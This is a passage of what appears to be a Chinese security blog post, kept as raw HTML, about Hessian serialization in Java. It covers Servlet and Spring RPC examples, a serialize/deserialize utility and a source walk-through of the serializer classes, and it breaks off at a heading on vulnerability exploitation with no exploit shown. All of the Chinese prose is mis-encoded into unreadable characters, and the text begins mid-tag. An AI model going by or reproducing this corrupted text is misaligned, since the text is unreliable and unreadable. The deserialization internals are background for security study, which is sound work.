title="åŸºäºServlet"></a>åŸºäºServlet</h2><p>å®šä¹‰ä¸€ä¸ªæ–¹æ³•æ¥å£</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœåŠ¡ç«¯åˆ›å»ºè¯¥æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œå¹¶ç»§æ‰¿com.caucho.hessian.server.HessianServletæ¥å°†å…¶æ ‡è®°ä¸ºä¸€ä¸ªæä¾›æœåŠ¡çš„Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.server.HessianServlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><span class="hljs-meta">@WebServlet(name = &quot;hessian&quot;, value = &quot;/hessian&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HessianServlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello &quot;</span>+o.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åéœ€è¦é…ç½®Servletæ˜ å°„ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç”¨äº†æ³¨è§£ï¼Œä¹Ÿå¯ä»¥ç”¨web.xmlæ¥é…ç½®</p><p>Client ç«¯é€šè¿‡ <code>com.caucho.hessian.client.HessianProxyFactory</code> å·¥å‚ç±»åˆ›å»ºå¯¹æ¥å£çš„ä»£ç†å¯¹è±¡ï¼Œå¹¶è¿›è¡Œè°ƒç”¨ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨åæ‰§è¡Œäº†æœåŠ¡ç«¯çš„é€»è¾‘å¹¶è¿”å›äº†ç»“æœã€‚</p><blockquote><p>è¿™ä¸€éƒ¨åˆ†å’ŒRMIçš„è¿œç¨‹è°ƒç”¨ç±»ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡ä»£ç†åˆ›å»ºå¯¹è±¡æ¥æ‰§è¡Œæ–¹æ³•çš„ï¼Œç­‰ä¼šåˆ†ææºç çš„æ—¶å€™ä¹Ÿä¼šçœ‹åˆ°</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8080/HessianServlet_war_exploded/hessian&quot;</span>;<br>        <span class="hljs-type">HessianProxyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianProxyFactory</span>();<br>        <span class="hljs-type">Greeting</span> <span class="hljs-variable">greeting</span> <span class="hljs-operator">=</span> (Greeting) factory.create(Greeting.class, url);<br>        HashMap&lt;Object, Object&gt; object = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        object.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Hessian Call: &quot;</span>+greeting.sayHello(object));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410091058542.png" alt="image-20241009105834433"></p><p>è¿™é‡ŒHessianå¹¶ä¸éœ€è¦åƒRMIé‚£æ ·æ¥å£çš„åŒ…åéœ€è¦ç›¸åŒã€‚</p><h2 id="åŸºäºspring"><a href="#åŸºäºSpring" class="headerlink" title="åŸºäºSpring"></a>åŸºäºSpring</h2><p>Spring-web åŒ…å†…æä¾›äº† <code>org.springframework.remoting.caucho.HessianServiceExporter</code> ç”¨æ¥æš´éœ²è¿œç¨‹è°ƒç”¨çš„æ¥å£å’Œå®ç°ç±»ã€‚ä½¿ç”¨è¯¥ç±» export çš„ Hessian Service å¯ä»¥è¢«ä»»ä½• Hessian Client è®¿é—®ï¼Œå› ä¸º Spring ä¸­é—´æ²¡æœ‰è¿›è¡Œä»»ä½•ç‰¹æ®Šå¤„ç†ã€‚</p><p>ä» spring-web-5.3 åï¼Œè¯¥ç±»è¢«æ ‡è®°ä¸º <code>@Deprecated</code> ï¼Œ ä¹Ÿå°±æ˜¯è¯´ spring åœ¨é€æ¸æ·˜æ±°å¯¹åŸºäºåºåˆ—åŒ–çš„è¿œç¨‹è°ƒç”¨çš„ç›¸å…³æ”¯æŒã€‚</p><blockquote><p>æˆ‘è¿™é‡Œä¸€å¼€å§‹springboot3é‡Œé¢çš„spring-webæ˜¯6.1.13çš„ç‰ˆæœ¬ï¼Œæ˜¯ç›´æ¥è¿HessianServiceExporterè¿™ä¸ªç±»ä¹Ÿæ‰¾ä¸åˆ°äº†</p></blockquote><p>è¿™é‡Œå°±ä¸å°è¯•äº†ï¼Œcopyä¸€ä¸‹å®˜æ–¹æ–‡æ¡£çš„ä»£ç ç¤ºä¾‹ï¼š<a href="https://www.baeldung.com/spring-remoting-hessian-burlap">https://www.baeldung.com/spring-remoting-hessian-burlap</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">bookingService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">HessianServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯æš´éœ²æœåŠ¡çš„ä»£ç ï¼Œå®¢æˆ·ç«¯åŒæ ·ç”¨å‰é¢çš„å³å¯ï¼Œåªéœ€è¦æ”¹ä¸€ä¸‹url</p><p>ä»–è¿˜æœ‰ä½¿ç”¨Burlapåè®®çš„å†™æ³•</p><p>æš´éœ²æœåŠ¡ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">burlapService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> BurlapProxyFactoryBean <span class="hljs-title function_">burlapInvoker</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapProxyFactoryBean</span> <span class="hljs-variable">invoker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapProxyFactoryBean</span>();<br>    invoker.setServiceUrl(<span class="hljs-string">&quot;http://localhost:8080/booking&quot;</span>);<br>    invoker.setServiceInterface(CabBookingService.class);<br>    <span class="hljs-keyword">return</span> invoker;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™æ³•åŸºæœ¬å’Œä½¿ç”¨hessianä¸€è‡´</p><h2 id="è‡ªå°è£…è°ƒç”¨"><a href="#è‡ªå°è£…è°ƒç”¨" class="headerlink" title="è‡ªå°è£…è°ƒç”¨"></a>è‡ªå°è£…è°ƒç”¨</h2><p>å°±æ˜¯é€šè¿‡å¯¹ <code>HessianInput/HessianOutput</code>ã€<code>Hessian2Input/Hessian2Output</code>ã€<code>BurlapInput/BurlapOutput</code> çš„ç›¸å…³æ–¹æ³•çš„å°è£…ï¼Œå¯ä»¥è‡ªè¡Œå®ç°ä¼ è¾“ã€å­˜å‚¨ç­‰é€»è¾‘ï¼Œä½¿ç”¨ Hessian è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ•°æ®ã€‚</p><p>è¿™é‡Œçš„Inputå’ŒOutputæ–¹æ³•å°±æ˜¯ç›´æ¥è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•ï¼Œå‰é¢çš„è°ƒç”¨ä¹Ÿéƒ½æ˜¯å¯¹è¿™äº›æ–¹æ³•è¿›è¡Œäº†å°è£…ï¼ŒOutputå°±æ˜¯åºåˆ—åŒ–å‡ºå»ï¼ŒInputå°±æ˜¯ååºåˆ—åŒ–</p><p>Inputæ–¹æ³•éƒ½ç»§æ‰¿è‡ªAbstractHessianInputè¿™ä¸ªæŠ½è±¡ç±»</p><p><img src="https://cdn.clown2024.cn/202410091608295.png" alt="image-20241009160850197"></p><p>Outputæ–¹æ³•åˆ™ç»§æ‰¿AbstractHessianOutputæŠ½è±¡ç±»</p><p><img src="https://cdn.clown2024.cn/202410091609188.png" alt="image-20241009160949153"></p><p>è¿™é‡Œå°è£…æˆä¸€ä¸ªå·¥å…·ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianUtil</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessianåºåˆ—åŒ–</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] result=<span class="hljs-literal">null</span>;<br>        Hessian2Output oo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(bos);<span class="hljs-comment">//å°è£…å­—èŠ‚æµ</span><br>        oo.writeObject(obj);<span class="hljs-comment">//å†™å…¥åºåˆ—åŒ–å¯¹è±¡å­—èŠ‚æµ</span><br>        oo.flush();<br>        result=bos.toByteArray();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessianååºåˆ—åŒ–</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> bytes</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        Hessian2Input oi=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bis);<br>        <span class="hljs-keyword">return</span> oi.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="jndiè°ƒç”¨"><a href="#JNDIè°ƒç”¨" class="headerlink" title="JNDIè°ƒç”¨"></a>JNDIè°ƒç”¨</h2><p>Hessian è¿˜å¯ä»¥é€šè¿‡å°† HessianProxyFactory é…ç½®ä¸º JNDI Resource çš„æ–¹å¼æ¥è°ƒç”¨ã€‚çœ‹æ–‡ç« æ˜¯ç”¨äº†resinæ¥é…ç½®çš„ï¼Œæˆ‘æ²¡æŸ¥åˆ°web.xmlçš„é…ç½®ï¼Œæˆªä¸ªæ–‡ç« çš„å›¾çŸ¥é“ä¸€ä¸‹ç®—äº†</p><p><img src="https://cdn.clown2024.cn/202410091644186.png" alt="image-20241009164415140"></p><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><h2 id="æ¥å£è°ƒç”¨"><a href="#æ¥å£è°ƒç”¨" class="headerlink" title="æ¥å£è°ƒç”¨"></a>æ¥å£è°ƒç”¨</h2><p>é‚£å‰é¢çš„åŸºäºServletçš„ä»£ç å…ˆæ¥åˆ†æï¼ŒHessianServletæ˜¯HttpServletçš„å­ç±»ï¼Œé‚£ä¹ˆHessianServlet çš„<code>init</code> æ–¹æ³•å°†ä¼šæ‰¿æ‹…ä¸€äº›åˆå§‹åŒ–çš„åŠŸèƒ½ï¼Œè€Œ <code>service</code> æ–¹æ³•å°†ä¼šæ˜¯ç›¸å…³å¤„ç†çš„èµ·å§‹ä½ç½®ã€‚</p><p>è¯¥ç±»çš„æˆå‘˜å˜é‡</p><p><img src="https://cdn.clown2024.cn/202410091650586.png" alt="image-20241009165055536"></p><p><code>_homeAPI</code>(è°ƒç”¨ç±»çš„æ¥å£ Class)ã€<code>_homeImpl</code>(å…·ä½“å®ç°ç±»çš„å¯¹è±¡)ã€<code>_serializerFactory</code>(åºåˆ—åŒ–å·¥å‚ç±»)ã€<code>_homeSkeleton</code>(å°è£…æ–¹æ³•)</p><p>çœ‹ä¸€ä¸‹initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091655779.png" alt="image-20241009165531713"></p><p>å°±æ˜¯å¯¹å„å˜é‡è¿›è¡Œåˆ¤æ–­æ˜¯å¦ä¸ºç©ºæ¥è¿›è¡Œåˆå§‹åŒ–ï¼Œå®ƒé‡Œé¢è°ƒç”¨äº†loadClassæ–¹æ³•æ¥åŠ è½½ç±»ï¼Œä¸è¿‡ä»–è¿™é‡Œè‡ªå·±é‡å†™äº†ä¸€ä¸ªloadClass</p><p><img src="https://cdn.clown2024.cn/202410091716251.png" alt="image-20241009171609208"></p><p><img src="https://cdn.clown2024.cn/202410091716148.png" alt="image-20241009171618113"></p><p>è¿™é‡Œä¼˜å…ˆä»çº¿ç¨‹è·å–ç±»åŠ è½½å™¨ï¼Œåº”è¯¥æ˜¯ä¸ºäº†æ›´å¿«åŠ è½½åˆ°å¯¹åº”çš„ç±»ï¼Œé¿å…èµ°åŒäº²å§”æ´¾çš„æµç¨‹ï¼Œçº¿ç¨‹çš„é»˜è®¤çš„ç±»åŠ è½½å™¨æ˜¯AppClassLoader</p><p>ç„¶åçœ‹ä»–çš„serviceæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091723880.png" alt="image-20241009172300818"></p><p>å¯ä»¥çœ‹åˆ°åªæ”¯æŒPOSTè¯·æ±‚ï¼Œè·å–idæˆ–è€…ejbidä½œä¸ºobjectIdï¼Œç„¶åè®¾ç½®ä¸€ä¸ªå“åº”å¤´ï¼Œå†å»è°ƒç”¨invokeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091724012.png" alt="image-20241009172457963"></p><p>ç„¶åå°±æ ¹æ®objectIdæ˜¯å¦ä¸ºç©ºæ¥é€‰æ‹©è°ƒç”¨çš„æ–¹æ³•</p><p>å…ˆçœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªæ–¹æ³•com.caucho.hessian.server.HessianSkeleton#invoke</p><p>è¯¥ç±»çš„çˆ¶ç±»æ˜¯AbstractSkeletonï¼Œè¯¥ç±»å¯¹Hessianæä¾›çš„æœåŠ¡è¿›è¡Œå°è£…</p><p><img src="https://cdn.clown2024.cn/202410091929088.png" alt="image-20241009192918042"></p><p>å…¶å°†æ–¹æ³•ã€æ–¹æ³•åç­‰ä¿å­˜åœ¨_methodMapé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410091932778.png" alt="image-20241009193223729"></p><p>ç„¶åHessianSkeletonåˆå§‹åŒ–å°±å°†è‡ªå·±çš„å®ç°ç±»ä¿å­˜åœ¨_serviceå˜é‡é‡Œé¢</p><p>è¯¥ç±»é‡Œé¢è¿˜æœ‰ä¸¤ä¸ªæˆå‘˜å˜é‡è¦çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410091937552.png" alt="image-20241009193725504"></p><p>ä¸¤ä¸ªå·¥å‚ç±»ï¼ŒHessianInputFactoryå°±æ˜¯ç”¨æ¥è¯»å–å’Œåˆ›å»ºHessianInput&#x2F;Hessian2Input æµï¼ŒHessianFactoryç”¨æ¥</p><p>åˆ›å»ºHessianInput&#x2F;Hessian2Input&#x2F;HessianOutput&#x2F;Hessian2Outputæµ</p><p>å¯¹ç±»åŸºæœ¬äº†è§£åå›è¿‡å¤´ç»§ç»­çœ‹invokeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091949119.png" alt="image-20241009194929048"></p><p>ä¸€å¼€å§‹è°ƒç”¨_inputFactoryè¯»å–headerï¼Œç„¶åæ ¹æ®headeræ¥åˆ›å»ºå¯¹åº”çš„Inputå’ŒOutputæµï¼Œæœ€åå†invokeè°ƒç”¨ä¸€æ¬¡æœåŠ¡</p><p>è¿™é‡Œä»£ç æ¯”è¾ƒé•¿å°±ç›´æ¥æˆªæ–‡ç« é‡Œçš„å›¾äº†ï¼Œè¿™ä¸ªå›¾å†™äº†æ³¨é‡Š</p><p><img src="https://cdn.clown2024.cn/202410092030361.png" alt="image-20241009203055295"></p><p>è¿˜æœ‰springçš„é€»è¾‘ä¹Ÿå·®ä¸å¤šçœ‹çœ‹æ–‡ç« çš„å°±å¥½äº†</p><h2 id="åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚"><a href="#åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚" class="headerlink" title="åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚"></a>åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚</h2><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¯»å–ã€å†™å…¥å°±æ˜¯ç”±æˆ‘ä»¬å‰é¢æåˆ°è¿‡çš„AbstractHessianInput&#x2F;AbstractHessianOutputè¿™ä¸¤ä¸ªæŠ½è±¡ç±»æä¾›ï¼Œç„¶åHessian&#x2F;Hessian2&#x2F;Burlapéƒ½æä¾›äº†æ–¹æ³•çš„å…·ä½“å®ç°</p><p>ä»¥Hessian2Outputä¸ºä¾‹å­çœ‹çœ‹åºåˆ—åŒ–çš„å†™å…¥</p><p><img src="https://cdn.clown2024.cn/202410092039705.png" alt="image-20241009203934647"></p><p>è¿™é‡Œæ ¹æ®å…·ä½“çš„ç±»æ¥è·å–åºåˆ—åŒ–å™¨ç„¶åå†™å…¥åºåˆ—åŒ–æ•°æ®ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹Serializerçš„å®ç°ç±»æœ‰å¤šå°‘</p><p><img src="https://cdn.clown2024.cn/202410092044894.png" alt="image-20241009204454835"></p><p>å¯¹äºè‡ªå®šä¹‰ç±»å‹ï¼Œå°†ä¼šä½¿ç”¨ <code>JavaSerializer/UnsafeSerializer/JavaUnsharedSerializer</code> è¿›è¡Œç›¸å…³çš„åºåˆ—åŒ–åŠ¨ä½œï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ <code>UnsafeSerializer</code></p><p>çœ‹ä¸€ä¸‹UnsafeSerializer#writeObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410092233208.png" alt="image-20241009223331142"></p><p>è¿™é‡Œä¼šè°ƒç”¨ä¸€ä¸ªwriteObjectBeginæ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯AbstractHessianOutputçš„</p><p><img src="https://cdn.clown2024.cn/202410092236620.png" alt="image-20241009223618572"></p><p>é‡Œé¢å†è°ƒç”¨äº†ä¸€ä¸ªwriteMapBeginæ–¹æ³•ï¼ŒHessian2Output é‡å†™äº†writeObjectBeginè¿™ä¸ªæ–¹æ³•ï¼Œè€Œå…¶ä»–å®ç°ç±»æ²¡æœ‰ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨ Hessian 1.0 å’Œ Burlap ä¸­ï¼Œå†™å…¥è‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼ˆObjectï¼‰æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨ <code>writeMapBegin</code> æ–¹æ³•å°†å…¶æ ‡è®°ä¸º Map ç±»å‹ã€‚</p><p>åœ¨ Hessian 2.0 ä¸­ï¼Œå°†ä¼šè°ƒç”¨ <code>writeDefinition20</code> å’Œ <code>Hessian2Output#writeObjectBegin</code> æ–¹æ³•å†™å…¥è‡ªå®šä¹‰æ•°æ®ï¼Œå°±ä¸å†å°†å…¶æ ‡è®°ä¸º Map ç±»å‹ã€‚</p><p>å†çœ‹ååºåˆ—åŒ–ï¼Œä»¥Hessian2Inputä¸ºä¾‹</p><p><img src="https://cdn.clown2024.cn/202410092244449.png" alt="image-20241009224448389"></p><p>åŸºæœ¬å°±æ˜¯ä¸€å¤§ä¸²çš„switch caseè¯­å¥ï¼Œæ ¹æ®æ ‡è¯†ä½è¿›è¡Œä¸åŒçš„é€»è¾‘å¤„ç†</p><p><img src="https://cdn.clown2024.cn/202410092309278.png" alt="image-20241009230909226"></p><p>ä»–åœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿä¼šæ ¹æ®ç±»å‹è·å–å¯¹åº”çš„ååºåˆ—åŒ–å™¨</p><p><img src="https://cdn.clown2024.cn/202410092312974.png" alt="image-20241009231208927"></p><p>ç„¶åè¯»å–è‡ªå®šä¹‰ç±»å‹æ•°æ®ç”¨çš„æ˜¯UnsafeDeserializerç±»ï¼Œçœ‹ä¸€ä¸‹ä»–çš„readObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410092315911.png" alt="image-20241009231538854"></p><p><img src="https://cdn.clown2024.cn/202410092320613.png" alt="image-20241009232015561"></p><p>åˆ›å»ºUnsafeç±»å®ä¾‹ï¼Œç„¶åååºåˆ—åŒ–è¯»å–Fieldå¹¶åå°„å†™å…¥</p><p><img src="https://cdn.clown2024.cn/202410092320165.png" alt="image-20241009232019114"></p><p>Hessian 1.0 çš„ HessianInput ä¸­ï¼Œæ²¡æœ‰é’ˆå¯¹ Object çš„è¯»å–ï¼Œè€Œæ˜¯éƒ½å°†å…¶ä½œä¸º Map è¯»å–ï¼Œå› ä¸ºåœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¹Ÿæåˆ°ï¼Œåœ¨å†™å…¥è‡ªå®šä¹‰ç±»å‹æ—¶ä¼šå°†å…¶æ ‡è®°ä¸º Map ç±»å‹ã€‚</p><p><code>MapDeserializer#readMap</code> æ–¹æ³•æä¾›äº†é’ˆå¯¹ Map ç±»å‹æ•°æ®çš„å¤„ç†é€»è¾‘</p><p><img src="https://cdn.clown2024.cn/202410092327669.png" alt="image-20241009232731601"></p><h2 id="è¿œç¨‹è°ƒç”¨"><a href="#è¿œç¨‹è°ƒç”¨" class="headerlink" title="è¿œç¨‹è°ƒç”¨"></a>è¿œç¨‹è°ƒç”¨</h2><p>è¿˜æ˜¯æ ¹æ®å‰é¢çš„å®¢æˆ·ç«¯ä»£ç æ¥è°ƒè¯•ï¼Œæ ¹æ®createæ–¹æ³•ä¸€è·¯å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410092353919.png" alt="image-20241009235359859"></p><p>åœ¨è¿™é‡Œåˆ›å»ºäº†åŠ¨æ€ä»£ç†ï¼Œæˆ‘ä»¬çŸ¥é“åŠ¨æ€ä»£ç†è°ƒç”¨æ–¹æ³•æ—¶ä¼šèµ°InvocationHandler#invokeæ–¹æ³•ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410100001263.png" alt="image-20241010000103202"></p><p>è¿™é‡Œæ˜¯å¤„ç†ç›¸å…³æ–¹æ³•è°ƒç”¨ï¼Œå†å¾€åå°±æ˜¯å‘é€è¯·æ±‚ç»“æœå¹¶ååºåˆ—åŒ–ï¼Œæˆªä¸€ä¸‹æ–‡ç« çš„å›¾</p><p><img src="https://cdn.clown2024.cn/202410100008161.png" alt="image-20241010000832095"></p><h2 id="å…¶ä»–å®ç°ç»†èŠ‚"><a href="#å…¶ä»–å®ç°ç»†èŠ‚" class="headerlink" title="å…¶ä»–å®ç°ç»†èŠ‚"></a>å…¶ä»–å®ç°ç»†èŠ‚</h2><p><strong>åè®®ç‰ˆæœ¬</strong></p><p>ä½¿ç”¨é‚£ç§åè®®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–å–å†³äºè¯·æ±‚æ ‡å¿—ä½</p><p>è¿™ä¸€è®¾å®šä½äº <code>HessianProxyFactory</code> ä¸­çš„ä¸¤ä¸ªå¸ƒå°”å‹å˜é‡ä¸­ï¼Œå³ <code>_isHessian2Reply</code> å’Œ <code>_isHessian2Request</code></p><p><img src="https://cdn.clown2024.cn/202410100012841.png" alt="image-20241010001231800"></p><p>æƒ³æ›´æ”¹åè®®è‡ªå·±setæ–¹æ³•è®¾ç½®å³å¯</p><p><strong>Serializable</strong></p><p>æˆ‘ä»¬çŸ¥é“åœ¨Java åŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œå®ç°äº† <code>java.io.Serializable</code> æ¥å£çš„ç±»æ‰å¯ä»¥ååºåˆ—åŒ–</p><p>Hessianåœ¨è·å–é»˜è®¤åºåˆ—åŒ–å™¨çš„æ—¶å€™ä¼šæ£€æŸ¥æ˜¯å¦å®ç°äº†Serializableæ¥å£</p><p><img src="https://cdn.clown2024.cn/202410100020094.png" alt="image-20241010002017043"></p><p>ä½†æ˜¯æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ª_isAllowNonSerializableå˜é‡ï¼Œå®ƒå¯ä»¥æ‰“ç ´è¿™ç§è§„èŒƒï¼Œæˆ‘ä»¬åªè¦ç”¨setæ–¹æ³•å°†ä»–è®¾ç½®ä¸ºtrueï¼Œè¿™æ ·æ²¡æœ‰å®ç°Serializableæ¥å£çš„ç±»ä¹Ÿèƒ½åºåˆ—åŒ–</p><p>ç„¶åæ˜¯ transient å’Œ static çš„é—®é¢˜ï¼Œåœ¨åºåˆ—åŒ–æ—¶ï¼Œç”± <code>UnsafeSerializer#introspect</code> æ–¹æ³•æ¥è·å–å¯¹è±¡ä¸­çš„å­—æ®µï¼Œåœ¨è€ç‰ˆæœ¬ä¸­åº”è¯¥æ˜¯ <code>getFieldMap</code> æ–¹æ³•ã€‚ä¾æ—§æ˜¯åˆ¤æ–­äº†æˆå‘˜å˜é‡æ ‡è¯†ç¬¦ï¼Œå¦‚æœæ˜¯ transient å’Œ static å­—æ®µåˆ™ä¸ä¼šå‚ä¸åºåˆ—åŒ–ååºåˆ—åŒ–æµç¨‹ã€‚</p><p><img src="https://cdn.clown2024.cn/202410100024721.png" alt="image-20241010002444663"></p><p>è¿™ä¸ªåœ°æ–¹å¯¹æ ‡è¯†ç¬¦è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœä¸º transient å’Œ static å­—æ®µåˆ™ä¸ä¼šå‚ä¸åºåˆ—åŒ–ååºåˆ—åŒ–æµç¨‹</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" 